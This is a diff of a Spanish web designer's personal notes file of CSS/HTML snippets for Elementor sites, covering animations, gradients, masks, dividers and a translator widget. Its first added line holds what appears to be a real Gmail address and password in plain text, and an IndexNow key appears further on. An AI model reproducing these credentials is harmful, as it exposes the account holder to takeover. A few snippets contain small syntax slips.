@@ -1,18 +1,77 @@
+jhonnylubodisenador@gmail.com contraseña jhonnylubo.disenador321
+
+jhonnylubo9@gmail.com, 
+
 repertorio de jhony:
 https://jhonnylubo.notion.site/Repertorio-de-c-digos-Escuela-1395141ee60d803dba9cc0e5f8c1ce84
 Respaldo:
 https://www.notion.so/Repertorio-de-c-digos-Escuela-13925d83621a8038af91c574130d2c47
 
-INFO
-Estructura: animation: nombreanimacion tiempo infinite;
-
-infinite (bucle), 
+Blog de animaciones css: 
+https://www.hgwebstudio.com/category/website-design/css-button-animation/
+https://digitalmaxon.com/#
 
 
 buscar todo lo de una  web /?s=
 
-#########################################
+https://api.indexnow.org/indexnow?url=https://joseabdiel.com/strategic-web-design-ai-automation/&key=fbea2e47f3a44386a5c80fabb585f5aa
 
+url para publicar mi web en pinteres: 
+https://joseabdiel.com/?utm_source=pinterest&post=Hub365_ai_collaboration_abdiel
+
+para hacer ping en bing
+
+/*estilo solo en telefono o Celular*/
+@media (max-width: 767px) {
+    selector {
+        
+    }
+}
+
+
+
+mide velocidad 
+
+https://tools.pingdom.com/
+
+
+#########################################
+para oculta codigos y estilos globales.
+
+*{
+    --e-global-color-primary: #012f2c;
+    --e-global-color-secondary: #dabf94;
+    --e-global-color-text: #9c794f;
+    --e-global-color-accent: #045346;
+    
+    --e-global-color-95d98ac: #F4F4F4;
+    }
+    
+*:not(.fa):not(.fas):not(.far):not(i):not(.elementor-icon){
+    
+    font-family: 'Jost', Sans-serif !important;
+    
+}
+
+.codigos {
+    display: none;
+} 
+
+.codigo-abdiel {
+    position: absolute;
+    bottom: 0;
+    visibility: hidden;
+}
+
+visible algunos elementos
+
+selector {
+    z-index: 99;
+    top: 0;
+    visibility: visible !important;
+}
+
+#########################################
 borde gradiente en texto degradado dorado
     .oro {
         background-image: repeating-linear-gradient(
@@ -77,6 +136,115 @@ animacion icono que gira
 
 #########################################
 
+
+
+.desvanecido-vertical {
+    overflow: hidden;
+    -webkit-mask-image: linear-gradient(to top, transparent, black 20%, black 80%, transparent);
+    mask-image: linear-gradient(to top, transparent, black 20%, black 80%, transparent); /* Para compatibilidad con otros navegadores */
+}
+
+    .desvanecido-horizontal {
+        overflow: hidden;
+        -webkit-mask-image: linear-gradient(to right, transparent, black 20%, black 80%, transparent);
+        mask-image: linear-gradient(to right, transparent, black 20%, black 80%, transparent); /* Para compatibilidad con otros navegadores */
+    }
+
+
+#########################################
+
+
+poner un fondo a un contenedor y esto lo desplaza horizontalmente para mostrar toda la imagen del fondo ideal para mstrar capturas
+
+.fondo-desplazante {
+    background-position: top center;
+    background-size: cover;
+    transition: background-position 8s ease-in-out !important;
+    
+}
+
+.fondo-desplazante:hover {
+    transition: background-position 8s ease-in-out;
+    background-position: bottom center;
+    
+}
+
+opcion 2:
+
+.fondo-desplazante {
+    background-position: top center;
+    background-size: cover;
+    animation: moveToTop 5s forwards; /* Animación al quitar hover */
+}
+
+.fondo-desplazante:hover {
+    animation: moveToBottom 5s forwards; /* Animación al hacer hover */
+}
+
+@keyframes moveToBottom {
+    from {
+        background-position: top center;
+    }
+    to {
+        background-position: bottom center;
+    }
+}
+
+@keyframes moveToTop {
+    from {
+        background-position: bottom center;
+    }
+    to {
+        background-position: top center;
+    }
+}
+
+#########################################
+
+Texto destacado
+ejemplo: 
+Lorem fistrum <span class="background-destaque-roxo">Texto destacado</span> De la pradera ullamco qué dise usteer está la cosa muy malar.
+
+.background-destaque-roxo{
+    background: #1E007550;
+    padding: 0px 8px;
+    position: relative;
+    border-left: 1px solid #590CFE;
+    border-right: 1px solid #590CFE;
+    display: inline-block;
+}
+
+.gradient-text-destaque-roxo{
+    background: linear-gradient(90deg, #7520FF 0%, #590CFE 100%);
+    background-clip: text;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    box-decoration-break: clone;
+    -webkit-box-decoration-break: clone;
+}
+
+.background-destaque-roxo::after, .background-destaque-roxo::before{
+    content: '';
+    position: absolute;
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    pointer-events: none;
+    background-color: #590CFE;
+}
+.background-destaque-roxo::after{
+    top: -4px;
+    left: -4px;
+}
+
+.background-destaque-roxo::before{
+    right: -4px;
+    bottom: -4px;
+}/* End custom CSS */
+
+
+
+#########################################
 animacion un elemento flota en el mismo lugar como dentro de una caja invisible - movimiento sutil
 
 selector {
@@ -111,12 +279,181 @@ selector {
 }
 #########################################
 
+
+divisor ondulado para web top and bottom
+
+    <div class="custom-shape-divider divider-bottom">
+        <svg data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none">
+            <path d="M321.39,56.44c58-10.79,114.16-30.13,172-41.86,82.39-16.72,168.19-17.73,250.45-.39C823.78,31,906.67,72,985.66,92.83c70.05,18.48,146.53,26.09,214.34,3V0H0V27.35A600.21,600.21,0,0,0,321.39,56.44Z"></path>
+        </svg>
+    </div>
+
+
+    .divider-top {
+        top: 0;
+    }
+
+    .divider-bottom {
+        bottom: 0;
+        transform: rotate(180deg);
+    }
+
+    .custom-shape-divider {
+        position: absolute;
+        left: 0;
+        width: 100%;
+        overflow: hidden;
+        line-height: 0;
+    }
+
+    .custom-shape-divider-bottom svg {
+        position: relative;
+        display: block;
+        width: calc(100% + 1.3px);
+        height: 120px;
+    }
+
+    .shape-fill-oscuro path{
+        fill: #150317;
+    }
+
+    en go gith level para quitar espacios de los lados
+
+    #__nuxt .liberador {
+        position: absolute !important;
+        left: 0px !important;
+        width: 100% !important;
+        pointer-events: none !important;
+        padding: 0 !important;
+        margin: 0 !important;
+    }
+
+#########################################
+
+patron cuadriculado 2 solo css
+
+* tramado */
+body::before {
+    content: "";
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 9999999999999;
+    background-image: linear-gradient(#fff 1px, transparent 1px), linear-gradient(to right, #fff 1px, transparent 1px);
+    background-size: 6px 6px;
+    pointer-events: none;
+    opacity: 0.02;
+}
+
+#########################################
+.patron-cuadros::after {
+    content: '';
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    top: 0;
+    left: 0;
+    z-index: 2;
+    background-image: url(https://joseabdiel.com/wp-content/uploads/2025/03/patron-fondo-cuadros-joseabdie.com_.png);
+    background-size: 9px;
+    background-repeat: repeat;
+    background-position: center center;
+}
+
+#########################################
+
+ivestigar efecto pixel animado
+
+/* O container com efeito */
+.pixel-card {
+  position: relative;
+  overflow: hidden;
+  isolation: isolate;
+}
+
+/* O canvas animado fica colado no fundo do container */
+.pixel-card > pixel-canvas {
+  position: absolute;
+  inset: 0;
+  z-index: 0;
+  pointer-events: none; /* não bloqueia cliques */
+  mix-blend-mode: screen;  /* ou overlay, lighten, soft-light etc. */
+  opacity: 0.75;           /* controla a intensidade geral */
+
+    /* Fade só no efeito, não no conteúdo do card */
+  -webkit-mask-image: linear-gradient(
+    to bottom,
+    rgba(0,0,0,0) 0%,
+    rgba(0,0,0,0.05) 10%,
+    rgba(0,0,0,0.25) 30%,
+    rgba(0,0,0,0.6) 50%,
+    rgba(0,0,0,1) 75%
+  );
+  mask-image: linear-gradient(
+    to bottom,
+    rgba(0,0,0,0) 0%,
+    rgba(0,0,0,0.05) 10%,
+    rgba(0,0,0,0.25) 30%,
+    rgba(0,0,0,0.6) 50%,
+    rgba(0,0,0,1) 75%
+  );
+  /* ajuste fino opcional */
+  -webkit-mask-size: 100% 100%;
+  mask-size: 100% 100%;
+}
+
+###########################
+
+efecto regilla 
+
+
+.elementor-5062 .elementor-element.elementor-element-b37ec0e::before {
+    content: "";
+    opacity: .1;
+    background-color: #fff0;
+    background-image: linear-gradient(90deg, #d9d9d9, #d9d9d9 1px, transparent 1px, transparent 11px), linear-gradient(0deg, #d9d9d9, #d9d9d9 1px, transparent 1px, transparent 11px);
+    background-size: 50px 50px;
+    position: absolute;
+    border-radius: 0;
+    top: 0;
+    bottom: auto;
+    left: 0;
+    z-index: 1;
+    width: 100%;
+    height: 100%;
+    transition: .5s;
+    pointer-events: none;
+}
+
+
+###############################
 hacer fondo de una web con efecto ruido
 poner posicion relative al elemento
 
     body::after {
         content: '';
-        background-image: url('https://remansaleads.com/wp-content/uploads/2024/10/ruido-abdiel.webp');
+        background-image: url(https://joseabdiel.com/wp-content/uploads/2024/12/ruido-animado-abdiel.gif);
+        background-size: 200px;
+        background-repeat: repeat; /* Repetir la imagen */
+        background-position: center center; /* Centrar la imagen */
+        position: fixed; /* Posicionamiento absoluto */
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        opacity: 0.5; /* Opacidad al 70% */
+        mix-blend-mode: luminosity; /* Modo de fusión */
+        z-index: 0;
+        pointer-events: none;
+    }
+
+
+    body::after {
+        content: '';
+        background-image: url('https://joseabdiel.com/wp-content/uploads/2024/12/ruido-abdiel.webp');
+        background-size: 200px;
         background-repeat: repeat; /* Repetir la imagen */
         background-position: center center; /* Centrar la imagen */
         position: absolute; /* Posicionamiento absoluto */
@@ -129,7 +466,10 @@ poner posicion relative al elemento
         z-index: -1; /* Asegura que la capa esté detrás del contenido */
     }
 
+
+
 #########################################
+
 
 destello resplando que se desplaza horizontalmente en una caja o seccion
 
@@ -161,6 +501,25 @@ destello resplando que se desplaza horizontalmente en una caja o seccion
             left: 100%; /* Mueve el resplandor hasta el lado izquierdo */
         }
     }
+
+#########################################
+
+cinta o barra de texto simple
+
+.barra {
+    white-space: nowrap;
+    animation: 40s linear infinite barra
+}
+
+@keyframes barra {
+    0% {
+        transform: translateX(0)
+    }
+
+    100% {
+        transform: translateX(-1920px)
+    }
+}
 
 
 
@@ -206,6 +565,32 @@ Opcion2: para toda la pagina
         width:100%;
         overflow-x:hidden;
     }
+
+
+Mi version qu esi funciona
+    .elementor {
+        overflow-x: clip;
+        overflow-y: visible;
+    }
+#########################################
+scrip año footer actual
+
+ <span id="yr"></span>
+
+ <script>
+  document.getElementById('yr').textContent = new Date().getFullYear();
+</script>
+
+
+############
+cambiar el cursor
+
+body {
+    cursor: url(https://storage.googleapis.com/msgsndr/rpfGXwQGWBN80QBxnzZh/media/6863175….png) 1 9, auto;
+}
+
+12 12 tambien sirve par aotro es cuertion de jugar
+
 
 #########################################
 
@@ -254,13 +639,23 @@ efecto resplandor parpadeante - rayo - destellos - luz que apaga y prende
             display:none
         }
     }
+#########################################
+
+efecto-borde como difunimanado a los costado cabmbier el -top por la direcion que prefieras
+
+.borde-degradado {
+    border-top: 2px solid;
+    border-image: linear-gradient(to right,transparent,#11FF00,transparent) 1;
+}
+
 
 #########################################
 
 Witget Traductor Fuente: https://gtranslate.io/website-translator-widget
 
     <style>
-        .gt_float_switcher .gt-selected .gt-current-lang {
+
+.gt_float_switcher .gt-selected .gt-current-lang {
             padding: 5px 5px !important;
             color: #fff !important;
             font-size: 14px !important;
@@ -276,7 +671,7 @@ Witget Traductor Fuente: https://gtranslate.io/website-translator-widget
         }
         .gt_float_switcher .gt-selected .gt-current-lang {
             padding: 10px 15px;
-            color: #FFFFFF !important;
+            color: #0d0d0d !important;
             font-size: 14px !important;
             font-weight: bold;
         }
@@ -284,24 +679,26 @@ Witget Traductor Fuente: https://gtranslate.io/website-translator-widget
             background: #fff0 !important;
         }
         .gt-selected {
-            font-family: 'Poppins' !important;
+            font-family: "Montserrat" !important;
+            font-weight: 900 !important;
+            font-family:
             position: relative;
             z-index: 888;
-            color: #ffffff !important;
-            background-color: #290030 !important;
+            color: #0c3630 !important;
+            background-color: #00e000 !important;
             cursor: pointer;
-            border-radius: 10px !important;
-            border: solid #FFFFFF30 1px !important;
+            border-radius: 8px !important;
+            border: solid #0d0d0d 2px !important;
             text-transform: uppercase;
             overflow: hidden;
             text-align: left;
         }
 
-    </style>
+</style>
 
-    <div class="gtranslate_wrapper" style="position:fixed;bottom: 10px !important;left: 10px !important;z-index:999999;></div>
-    <script>window.gtranslateSettings = {"default_language":"es","languages":["es","ca"],"wrapper_selector":".gtranslate_wrapper"}</script>
-    <script src="https://cdn.gtranslate.net/widgets/latest/float.js" defer></script>
+<div class="gtranslate_wrapper" style="position:fixed;bottom: 10px !important;left: 10px !important;z-index:999999;"></div>
+<script>window.gtranslateSettings = {"default_language":"es","languages":["es","en","fr","it","pt"],"wrapper_selector":".gtranslate_wrapper"}</script>
+<script src="https://cdn.gtranslate.net/widgets/latest/float.js" defer></script>
 
 
 #########################################
@@ -474,22 +871,139 @@ CAJA MAGICA
 
 CARRUSEL CONTINUO DE ELEMENTOR: Nota: creo que no hace falta pero recuerda el Overflow hiden
 
-    .slider .swiper-wrapper {
+    .slider-continuo  .swiper-wrapper {
       -webkit-transition-timing-function: linear !important;
       transition-timing-function: linear !important;
     }
 
-    .slider .swiper-slide{
+    .slider-continuo  .swiper-slide{
         overflow: visible;
     }
 
-    .e-n-carousel.swiper.swiper-initialized.swiper-horizontal.swiper-pointer-events.swiper-backface-hidden{
+    .slider-continuo .e-n-carousel.swiper.swiper-initialized.swiper-horizontal.swiper-pointer-events.swiper-backface-hidden{
         overflow: visible;
     }
 
 
 #########################################
 
+elementos que flotan y se desvanecen hacia arriba
+
+/* Start custom CSS for icon, class: .elementor-element-1efcc55 */
+selector {
+    position: absolute;
+    bottom: 0px;
+    right: calc(50% - 500px);
+    animation: plus 7s infinite linear 1s;
+    overflow: visible;
+    filter: brightness(140%);
+}
+
+@keyframes plus {
+    0% {
+        transform: translate(0, 20px);
+        opacity: 0;
+    }
+
+    50% {
+        transform: translate(0, -400px) scale(1.3);
+        opacity: 1;
+    }
+
+    100% {
+        transform: translate(0, -600px);
+        opacity: 0;
+    }
+}
+
+/*Tablet*/
+@media (min-width: 767px) and (max-width:1024px) {
+    selector {
+        position: absolute;
+        bottom: 0px;
+        z-index: 2;
+        right: calc(50% - 210px);
+        animation: plus 7s infinite linear 1s;
+        overflow: visible;
+        filter: brightness(140%);
+    }
+}
+
+/*Celular*/
+@media (max-width: 767px) {
+    selector {
+        position: absolute;
+        bottom: 520px;
+        z-index: 2;
+        right: calc(50% - 120px);
+        animation: plus 10s infinite linear 1s;
+        overflow: visible;
+        filter: brightness(140%);
+    }
+}
+
+/* End custom CSS */
+
+
+
+
+
+
+/* Start custom CSS for icon, class: .elementor-element-58429b2 */
+selector {
+    position: absolute;
+    bottom: 0px;
+    right: calc(50% - 120px);
+    animation: plus2 6s infinite linear 1s;
+    overflow: visible;
+    filter: brightness(140%);
+}
+
+@keyframes plus2 {
+    0% {
+        transform: translate(0, 50px);
+        opacity: 0;
+    }
+
+    50% {
+        transform: translate(0, -100px) scale(1.3);
+        opacity: 1;
+    }
+
+    100% {
+        transform: translate(0, -200px);
+        opacity: 0;
+    }
+}
+
+/*Tablet*/
+@media (min-width: 768px) and (max-width: 1024px) {
+    selector {
+        position: absolute;
+        bottom: 0px;
+        right: calc(50% - 360px);
+        animation: plus2 8s infinite linear 2s;
+        overflow: visible;
+        filter: brightness(140%);
+    }
+}
+
+/*Celular*/
+@media (max-width: 767px) {
+    selector {
+        position: absolute;
+        bottom: 520px;
+        right: calc(50% + 120px);
+        animation: plus2 8s infinite linear 2s;
+        overflow: visible;
+        filter: brightness(140%);
+    }
+}
+
+/* End custom CSS */
+
+
+#########################################
 ANIMACION BOTON DEGRADADO (el degradado se despalza horizontalmente)
 
     .Boton-degradado .elementor-button{
@@ -533,6 +1047,820 @@ Animacion Boton (palpitante Pulso)
             box-shadow: 0 0 0 0 transparent;
         }
     }
+#########################################
+Animacion micro particulas locales minimalista
+
+<div class="particle-container">
+  <!-- 10 partículas base -->
+  <span class="particle p1"></span>
+  <span class="particle p2"></span>
+  <span class="particle p3"></span>
+  <span class="particle p4"></span>
+  <span class="particle p5"></span>
+  <span class="particle p6"></span>
+  <span class="particle p7"></span>
+  <span class="particle p8"></span>
+  <span class="particle p9"></span>
+  <span class="particle p10"></span>
+</div>
+<style>
+  /* ============================
+  1) CONTENEDOR DE PARTÍCULAS
+  Ajusta “--wc” y “--hc” según el espacio deseado
+  ============================ */
+  .particle-container {
+      --wc: 1140px;
+      --hc: 280px;
+      position: relative;
+      width: var(--wc);
+      height: var(--hc);
+  }
+
+  /*Tablet*/
+  @media (min-width: 768px) and (max-width:1024px) {
+      .particle-container {
+          width: 85vw;
+          height: 20.5vw;
+      }
+  }
+
+  /*Celular*/
+  @media (max-width: 767px) {
+      .particle-container {
+          width: 85vw;
+          height: 20vw;
+      }
+  }
+
+  selector * {
+      overflow: visible;
+  }
+
+  /* ============================
+  2) ESTILO BÁSICO DE TODAS
+  LAS PARTÍCULAS Y PSEUDOELEMENTOS
+  ============================ */
+  .particle-container .particle {
+      position: absolute;
+      display: block;
+      width: 2px;
+      height: 2px;
+      background: rgba(255,255,255,0.9);
+      border-radius: 50%;
+      opacity: 0;
+      /* arrancan invisibles, “aparecen” en su animación */
+      will-change: top, left, opacity;
+  }
+
+  /* Los pseudoelementos van anclados a la partícula base:
+  top/left: 0 para situarse en el mismo punto, luego aplican su propio “jitter” */
+  .particle-container .particle::before, .particle-container .particle::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      /* misma posición que la base */
+      left: 0;
+      display: block;
+      width: 2px;
+      height: 2px;
+      background: rgba(255,255,255,0.7);
+      border-radius: 50%;
+      opacity: 0;
+      /* idem, “aparecen” en su animación de jitter */
+      will-change: transform, opacity;
+  }
+
+  /* ============================
+  3) POSICIONES INICIALES DE CADA
+  PARTÍCULA BASE (p1…p10)
+  (Todas dentro de 0%–100% para que se vean)
+  ============================ */
+  .p1 {
+      top: 5%;
+      left: 10%;
+  }
+
+  .p2 {
+      top: 10%;
+      left: 80%;
+  }
+
+  .p3 {
+      top: 80%;
+      left: 15%;
+  }
+
+  .p4 {
+      top: 50%;
+      left: 90%;
+  }
+
+  .p5 {
+      top: 90%;
+      left: 60%;
+  }
+
+  .p6 {
+      top: 20%;
+      left: 30%;
+  }
+
+  .p7 {
+      top: 5%;
+      left: 50%;
+  }
+
+  .p8 {
+      top: 75%;
+      left: 75%;
+  }
+
+  .p9 {
+      top: 40%;
+      left: 20%;
+  }
+
+  .p10 {
+      top: 10%;
+      left: 40%;
+  }
+
+  /* ============================
+  4) ANIMACIONES “ROAM” SÓLO PARA LA BASE
+  Cada partícula base (pX) recorre una trayectoria distinta
+  animando top y left.
+  ============================ */
+  @keyframes roam1 {
+      0% {
+          opacity: 0;
+          top: 5%;
+          left: 10%;
+      }
+
+      10% {
+          opacity: 1;
+          top: 20%;
+          left: 30%;
+      }
+
+      30% {
+          opacity: 0.8;
+          top: 40%;
+          left: 5%;
+      }
+
+      50% {
+          opacity: 1;
+          top: 60%;
+          left: 50%;
+      }
+
+      70% {
+          opacity: 0.7;
+          top: 80%;
+          left: 10%;
+      }
+
+      90% {
+          opacity: 1;
+          top: 70%;
+          left: 30%;
+      }
+
+      100% {
+          opacity: 0;
+          top: 5%;
+          left: 10%;
+      }
+  }
+
+  @keyframes roam2 {
+      0% {
+          opacity: 0;
+          top: 10%;
+          left: 80%;
+      }
+
+      10% {
+          opacity: 1;
+          top: 25%;
+          left: 60%;
+      }
+
+      30% {
+          opacity: 0.8;
+          top: 50%;
+          left: 40%;
+      }
+
+      50% {
+          opacity: 1;
+          top: 60%;
+          left: 70%;
+      }
+
+      70% {
+          opacity: 0.7;
+          top: 90%;
+          left: 50%;
+      }
+
+      90% {
+          opacity: 1;
+          top: 75%;
+          left: 80%;
+      }
+
+      100% {
+          opacity: 0;
+          top: 10%;
+          left: 80%;
+      }
+  }
+
+  @keyframes roam3 {
+      0% {
+          opacity: 0;
+          top: 80%;
+          left: 15%;
+      }
+
+      10% {
+          opacity: 1;
+          top: 60%;
+          left: 5%;
+      }
+
+      30% {
+          opacity: 0.8;
+          top: 40%;
+          left: 20%;
+      }
+
+      50% {
+          opacity: 1;
+          top: 20%;
+          left: 40%;
+      }
+
+      70% {
+          opacity: 0.7;
+          top: 40%;
+          left: 60%;
+      }
+
+      90% {
+          opacity: 1;
+          top: 60%;
+          left: 30%;
+      }
+
+      100% {
+          opacity: 0;
+          top: 80%;
+          left: 15%;
+      }
+  }
+
+  @keyframes roam4 {
+      0% {
+          opacity: 0;
+          top: 50%;
+          left: 90%;
+      }
+
+      10% {
+          opacity: 1;
+          top: 30%;
+          left: 80%;
+      }
+
+      30% {
+          opacity: 0.8;
+          top: 10%;
+          left: 70%;
+      }
+
+      50% {
+          opacity: 1;
+          top: 40%;
+          left: 50%;
+      }
+
+      70% {
+          opacity: 0.7;
+          top: 70%;
+          left: 30%;
+      }
+
+      90% {
+          opacity: 1;
+          top: 60%;
+          left: 60%;
+      }
+
+      100% {
+          opacity: 0;
+          top: 50%;
+          left: 90%;
+      }
+  }
+
+  @keyframes roam5 {
+      0% {
+          opacity: 0;
+          top: 90%;
+          left: 60%;
+      }
+
+      10% {
+          opacity: 1;
+          top: 70%;
+          left: 55%;
+      }
+
+      30% {
+          opacity: 0.8;
+          top: 50%;
+          left: 40%;
+      }
+
+      50% {
+          opacity: 1;
+          top: 30%;
+          left: 20%;
+      }
+
+      70% {
+          opacity: 0.7;
+          top: 50%;
+          left: 40%;
+      }
+
+      90% {
+          opacity: 1;
+          top: 70%;
+          left: 60%;
+      }
+
+      100% {
+          opacity: 0;
+          top: 90%;
+          left: 60%;
+      }
+  }
+
+  @keyframes roam6 {
+      0% {
+          opacity: 0;
+          top: 20%;
+          left: 30%;
+      }
+
+      10% {
+          opacity: 1;
+          top: 40%;
+          left: 20%;
+      }
+
+      30% {
+          opacity: 0.8;
+          top: 60%;
+          left: 15%;
+      }
+
+      50% {
+          opacity: 1;
+          top: 80%;
+          left: 40%;
+      }
+
+      70% {
+          opacity: 0.7;
+          top: 60%;
+          left: 60%;
+      }
+
+      90% {
+          opacity: 1;
+          top: 40%;
+          left: 30%;
+      }
+
+      100% {
+          opacity: 0;
+          top: 20%;
+          left: 30%;
+      }
+  }
+
+  @keyframes roam7 {
+      0% {
+          opacity: 0;
+          top: 5%;
+          left: 50%;
+      }
+
+      10% {
+          opacity: 1;
+          top: 20%;
+          left: 45%;
+      }
+
+      30% {
+          opacity: 0.8;
+          top: 40%;
+          left: 50%;
+      }
+
+      50% {
+          opacity: 1;
+          top: 60%;
+          left: 55%;
+      }
+
+      70% {
+          opacity: 0.7;
+          top: 80%;
+          left: 60%;
+      }
+
+      90% {
+          opacity: 1;
+          top: 60%;
+          left: 50%;
+      }
+
+      100% {
+          opacity: 0;
+          top: 5%;
+          left: 50%;
+      }
+  }
+
+  @keyframes roam8 {
+      0% {
+          opacity: 0;
+          top: 75%;
+          left: 75%;
+      }
+
+      10% {
+          opacity: 1;
+          top: 55%;
+          left: 65%;
+      }
+
+      30% {
+          opacity: 0.8;
+          top: 35%;
+          left: 45%;
+      }
+
+      50% {
+          opacity: 1;
+          top: 15%;
+          left: 25%;
+      }
+
+      70% {
+          opacity: 0.7;
+          top: 45%;
+          left: 45%;
+      }
+
+      90% {
+          opacity: 1;
+          top: 65%;
+          left: 65%;
+      }
+
+      100% {
+          opacity: 0;
+          top: 75%;
+          left: 75%;
+      }
+  }
+
+  @keyframes roam9 {
+      0% {
+          opacity: 0;
+          top: 40%;
+          left: 20%;
+      }
+
+      10% {
+          opacity: 1;
+          top: 60%;
+          left: 10%;
+      }
+
+      30% {
+          opacity: 0.8;
+          top: 80%;
+          left: 30%;
+      }
+
+      50% {
+          opacity: 1;
+          top: 60%;
+          left: 50%;
+      }
+
+      70% {
+          opacity: 0.7;
+          top: 40%;
+          left: 40%;
+      }
+
+      90% {
+          opacity: 1;
+          top: 20%;
+          left: 30%;
+      }
+
+      100% {
+          opacity: 0;
+          top: 40%;
+          left: 20%;
+      }
+  }
+
+  @keyframes roam10 {
+      0% {
+          opacity: 0;
+          top: 10%;
+          left: 40%;
+      }
+
+      10% {
+          opacity: 1;
+          top: 30%;
+          left: 60%;
+      }
+
+      30% {
+          opacity: 0.8;
+          top: 50%;
+          left: 80%;
+      }
+
+      50% {
+          opacity: 1;
+          top: 70%;
+          left: 50%;
+      }
+
+      70% {
+          opacity: 0.7;
+          top: 50%;
+          left: 25%;
+      }
+
+      90% {
+          opacity: 1;
+          top: 30%;
+          left: 35%;
+      }
+
+      100% {
+          opacity: 0;
+          top: 10%;
+          left: 40%;
+      }
+  }
+
+  /* ============================
+  5) ASIGNAMOS ROTACIÓN A CADA
+  PARTÍCULA BASE (pX → roamX)
+  ============================ */
+  .p1 {
+      animation: roam1 18s infinite ease-in-out;
+      animation-delay: 0s;
+  }
+
+  .p2 {
+      animation: roam2 20s infinite ease-in-out;
+      animation-delay: 0.5s;
+  }
+
+  .p3 {
+      animation: roam3 19s infinite ease-in-out;
+      animation-delay: 1s;
+  }
+
+  .p4 {
+      animation: roam4 18s infinite ease-in-out;
+      animation-delay: 0.2s;
+  }
+
+  .p5 {
+      animation: roam5 19s infinite ease-in-out;
+      animation-delay: 0.7s;
+  }
+
+  .p6 {
+      animation: roam6 20s infinite ease-in-out;
+      animation-delay: 0.3s;
+  }
+
+  .p7 {
+      animation: roam7 21s infinite ease-in-out;
+      animation-delay: 1s;
+  }
+
+  .p8 {
+      animation: roam8 19s infinite ease-in-out;
+      animation-delay: 0.4s;
+  }
+
+  .p9 {
+      animation: roam9 20s infinite ease-in-out;
+      animation-delay: 0.6s;
+  }
+
+  .p10 {
+      animation: roam10 21s infinite ease-in-out;
+      animation-delay: 0.1s;
+  }
+
+  /* ============================
+  6) ANIMACIONES JITTER PARA
+  LOS PSEUDOELEMENTOS (::before y ::after)
+  – “JitterA” y “JitterB” distintos
+  ============================ */
+  @keyframes jitterA {
+      0% {
+          opacity: 0;
+          transform: translate(0, 0) scale(0.8);
+      }
+
+      20% {
+          opacity: 1;
+          transform: translate( 45px, -45px) scale(1);
+      }
+
+      40% {
+          opacity: 0.6;
+          transform: translate(-45px, 45px) scale(0.7);
+      }
+
+      60% {
+          opacity: 1;
+          transform: translate( 45px, 45px) scale(1.1);
+      }
+
+      80% {
+          opacity: 0.7;
+          transform: translate(-45px, -45px) scale(0.6);
+      }
+
+      100% {
+          opacity: 0;
+          transform: translate(0, 0) scale(0.8);
+      }
+  }
+
+  @keyframes jitterB {
+      0% {
+          opacity: 0;
+          transform: translate(0, 0) scale(0.6);
+      }
+
+      20% {
+          opacity: 1;
+          transform: translate(-43px, 45px) scale(1);
+      }
+
+      40% {
+          opacity: 0.6;
+          transform: translate( 43px,-45px) scale(0.8);
+      }
+
+      60% {
+          opacity: 1;
+          transform: translate(-43px,-45px) scale(1.2);
+      }
+
+      80% {
+          opacity: 0.7;
+          transform: translate( 43px, 45px) scale(0.5);
+      }
+
+      100% {
+          opacity: 0;
+          transform: translate(0, 0) scale(0.6);
+      }
+  }
+
+  /* ============================
+  7) ASIGNAMOS JITTER A CADA
+  PSEUDOELEMENTO CON RETRASOS ÚNICOS
+  ============================ */
+  /* La unión pX::before / pX::after mantienen la base, porque top/left=0
+  los sitúa exactamente en la posición de la partícula padre. Luego
+  cada uno hace su jitter extra con transform */
+  .p1::before {
+      animation: jitterA 8s infinite ease-in-out;
+      animation-delay: 0.2s;
+  }
+
+  .p1::after {
+      animation: jitterB 10s infinite ease-in-out;
+      animation-delay: 0.8s;
+  }
+
+  .p2::before {
+      animation: jitterA 10s infinite ease-in-out;
+      animation-delay: 0.5s;
+  }
+
+  .p2::after {
+      animation: jitterB 8s infinite ease-in-out;
+      animation-delay: 0.3s;
+  }
+
+  .p3::before {
+      animation: jitterA 8s infinite ease-in-out;
+      animation-delay: 0.7s;
+  }
+
+  .p3::after {
+      animation: jitterB 10s infinite ease-in-out;
+      animation-delay: 0.1s;
+  }
+
+  .p4::before {
+      animation: jitterA 10s infinite ease-in-out;
+      animation-delay: 0.4s;
+  }
+
+  .p4::after {
+      animation: jitterB 8s infinite ease-in-out;
+      animation-delay: 0.9s;
+  }
+
+  .p5::before {
+      animation: jitterA 8s infinite ease-in-out;
+      animation-delay: 0.6s;
+  }
+
+  .p5::after {
+      animation: jitterB 10s infinite ease-in-out;
+      animation-delay: 0.2s;
+  }
+
+  .p6::before {
+      animation: jitterA 10s infinite ease-in-out;
+      animation-delay: 0.3s;
+  }
+
+  .p6::after {
+      animation: jitterB 8s infinite ease-in-out;
+      animation-delay: 0.7s;
+  }
+
+  .p7::before {
+      animation: jitterA 8s infinite ease-in-out;
+      animation-delay: 0.5s;
+  }
+
+  .p7::after {
+      animation: jitterB 10s infinite ease-in-out;
+      animation-delay: 0.2s;
+  }
+
+  .p8::before {
+      animation: jitterA 10s infinite ease-in-out;
+      animation-delay: 0.6s;
+  }
+
+  .p8::after {
+      animation: jitterB 8s infinite ease-in-out;
+      animation-delay: 0.1s;
+  }
+
+  .p9::before {
+      animation: jitterA 8s infinite ease-in-out;
+      animation-delay: 0.8s;
+  }
+
+  .p9::after {
+      animation: jitterB 5s infinite ease-in-out;
+      animation-delay: 0.4s;
+  }
+
+  .p10::before {
+      animation: jitterA 10s infinite ease-in-out;
+      animation-delay: 0.7s;
+  }
+
+  .p10::after {
+      animation: jitterB 8s infinite ease-in-out;
+      animation-delay: 0.3s;
+  }
+</style>
+
 
 #########################################
 
@@ -576,6 +1904,13 @@ ANIMACION DESTELLOS (Multiples Circulos que brillan - luciernagas) Nota: poner O
             height: 100vh;
             width: 100vw;
         }
+
+        .fairy {
+          width: 0.9vw;
+          height: 0.9vw;
+        }
+
+
     }
 
     selector{
@@ -2410,13 +3745,17 @@ animacion para movimiento sutil de un elemento que flota
         animation: 26s ease-in-out infinite floating
     }
 
-    @keyframes floating {
-        0%,100% {
-            transform: translate(30px,-60px) rotate(95deg)
+    @keyframes movimiento {
+        0% {
+            transform: translate(30px,-60px)
         }
 
         50% {
             transform: translate(-40px,100px)
+        }
+
+        100% {
